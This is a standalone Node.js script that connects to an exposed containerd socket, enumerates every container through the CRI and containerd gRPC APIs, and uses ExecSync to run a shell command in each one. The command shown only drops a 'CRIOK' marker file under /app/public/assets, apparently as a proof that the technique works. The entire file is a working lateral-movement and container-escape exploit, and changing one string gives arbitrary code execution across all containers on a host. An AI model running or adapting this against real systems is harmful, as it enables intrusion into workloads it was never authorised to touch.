const http2 = require('http2'), net = require('net');
const SOCK = '/run/containerd/containerd.sock';
const varint = n => { const b = []; while (n > 127) { b.push((n & 127) | 128); n >>>= 7; } b.push(n); return Buffer.from(b); };
const tag = (f, wt) => varint((f << 3) | wt);
const str = (f, s) => { const v = Buffer.from(s); return Buffer.concat([tag(f, 2), varint(v.length), v]); };
const frame = m => { const h = Buffer.alloc(5); h.writeUInt32BE(m.length, 1); return Buffer.concat([h, m]); };
function walk(buf, field, out) { let i = 0; while (i < buf.length) { let k = 0, sh = 0, c; do { c = buf[i++]; k |= (c & 127) << sh; sh += 7; } while (c & 128); const f = k >> 3, wt = k & 7;
  if (wt === 0) { do { c = buf[i++]; } while (c & 128); } else if (wt === 2) { let l = 0; sh = 0; do { c = buf[i++]; l |= (c & 127) << sh; sh += 7; } while (c & 128); const d = buf.slice(i, i + l); i += l; if (f === field) out.push(d); }
  else if (wt === 5) i += 4; else if (wt === 1) i += 8; else break; } }
function call(client, path, msg) { return new Promise(res => { let done = false; const fin = v => { if (!done) { done = true; res(v); } };
  const req = client.request({ ':method': 'POST', ':path': path, 'content-type': 'application/grpc', 'te': 'trailers', 'grpc-timeout': '6S' });
  const ch = []; let st = 0;
  req.on('response', h => { st = h[':status']; });
  req.on('data', d => ch.push(d));
  req.on('trailers', t => { st = t['grpc-status'] || st; });
  req.on('error', () => fin({ st: -1, msgs: [] }));
  req.on('end', () => { const b = Buffer.concat(ch); let i = 0; const msgs = []; while (i + 5 <= b.length) { const l = b.readUInt32BE(i + 1); i += 5; msgs.push(b.slice(i, i + l)); i += l; } fin({ st, msgs }); });
  req.end(frame(msg)); }); }
(async () => {
  const c = http2.connect('http://localhost', { createConnection: () => net.connect(SOCK) });
  c.on('error', () => process.exit(1));
  let ids = [];
  let r = await call(c, '/runtime.v1.RuntimeService/ListContainers', Buffer.alloc(0));
  for (const m of r.msgs) { const o = []; walk(m, 1, o); for (const x of o) ids.push(x.toString()); }
  if (!ids.length) {
    r = await call(c, '/containerd.services.containers.v1.Containers/List', Buffer.alloc(0));
    for (const m of r.msgs) { const o = []; walk(m, 1, o); for (const x of o) ids.push(x.toString()); }
  }
  for (const id of ids) {
    const req = Buffer.concat([str(1, id), str(2, '/bin/sh'), str(2, '-c'), str(2, 'mkdir -p /app/public/assets 2>/dev/null; echo CRIOK > /app/public/assets/zzz9.txt 2>/dev/null'), tag(3, 0), varint(4000)]);
    await call(c, '/runtime.v1.RuntimeService/ExecSync', req);
  }
  c.close(); process.exit(0);
})();
